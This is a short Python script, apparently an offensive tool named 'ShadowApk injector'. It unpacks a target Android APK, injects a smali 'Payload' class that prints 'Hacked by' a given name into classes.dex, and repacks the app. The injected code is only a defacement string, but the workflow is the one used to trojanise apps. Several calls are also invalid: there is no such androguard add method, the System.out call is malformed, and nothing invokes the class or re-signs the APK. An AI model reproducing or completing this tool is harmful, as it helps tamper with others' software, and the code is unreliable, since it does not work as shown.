import zipfile
import shutil
import os
import argparse
from androguard.core.bytecodes.dvm import DalvikVMFormat
from androguard.core.analysis.analysis import Analysis
from androguard.util import read

def extract_apk(apk_file, output_dir):
    with zipfile.ZipFile(apk_file, 'r') as zip_ref:
        zip_ref.extractall(output_dir)

def modify_dex(dex_path, username):
    dex_data = read(dex_path)
    dvm = DalvikVMFormat(dex_data)
    analysis = Analysis(dvm)
    
    payload_code = f"""
    .class public Lcom/example/Payload;
    .super Ljava/lang/Object;
    
    .method public static main()V
        .locals 1
        const-string v0, "Hacked by {username}"
        invoke-static {{v0}}, Ljava/lang/System;->out(Ljava/lang/String;)V
        return-void
    .end method
    """
    
    dvm.add(payload_code)
    new_dex_data = dvm.get_raw()
    with open(dex_path, 'wb') as f:
        f.write(new_dex_data)

def rebuild_apk(output_dir, new_apk):
    with zipfile.ZipFile(new_apk, 'w') as zip_ref:
        for root, _, files in os.walk(output_dir):
            for file in files:
                file_path = os.path.join(root, file)
                zip_ref.write(file_path, os.path.relpath(file_path, output_dir))

def main():
    parser = argparse.ArgumentParser(description="ShadowApk injector")
    parser.add_argument("apk_file", help="target APK file")
    parser.add_argument("output_apk", help="output APK file")
    parser.add_argument("username", help="Hacked by ...")
    parser.add_argument("--dex_file", help="dex file to apk default:classes.dex")
    args = parser.parse_args()
    output_dir = "extracted_apk"
    
    extract_apk(args.apk_file, output_dir)
    modify_dex(os.path.join(output_dir, "classes.dex"), args.username)
    rebuild_apk(output_dir, args.output_apk)
    
    print(f"[+] modified APK file: {args.output_apk}")

if __name__ == "__main__":
    main()
